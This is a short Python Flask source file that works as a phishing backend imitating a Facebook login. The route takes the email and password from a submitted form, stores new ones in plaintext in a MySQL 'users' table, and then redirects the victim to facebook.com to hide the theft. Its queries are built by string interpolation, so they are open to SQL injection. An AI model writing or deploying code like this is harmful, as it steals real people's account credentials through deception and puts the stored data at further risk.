from flask import Flask, render_template, redirect, request
import mysql.connector
from mysql.connector import errorcode
from flask_cors import CORS

app = Flask(__name__)

CORS(app)
mysql_config = {
    'host' : '127.0.0.1',
    'port': '3306',
    'user': 'root', 
    'database': 'fbdb'
}
"""
connection = mysql.connector.connect(**mysql_config)
cursor = connection.cursor()
table_name = "users"
query = f"DESCRIBE {table_name}"
cursor.execute(query)
table_names = cursor.fetchall()
print("Tables in the database:")
for table in table_names:
    print(table[0])
"""

@app.route('/', methods=['GET', 'POST'])
def loxn():
    if request.method == 'POST':
        username = request.form['email']
        password = request.form['pass']
        connection = mysql.connector.connect(**mysql_config)
        cursor = connection.cursor()
        query = f"SELECT id FROM users WHERE username = '{username}'"
        cursor.execute(query)
        id = cursor.fetchone()
        cursor.close()
        connection.close()

        #if users credentials are already in database just redirect
        #otherwise save credentials in database then redirect
        if id:
            return redirect("https://facebook.com")
        else:
            connection = mysql.connector.connect(**mysql_config)
            cursor = connection.cursor()
            query = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"
            cursor.execute(query)
            connection.commit()
            cursor.close()
            connection.close()
            return redirect("https://facebook.com")
    return render_template('index.html')

if __name__ == "__main__":
    app.run(debug=True)
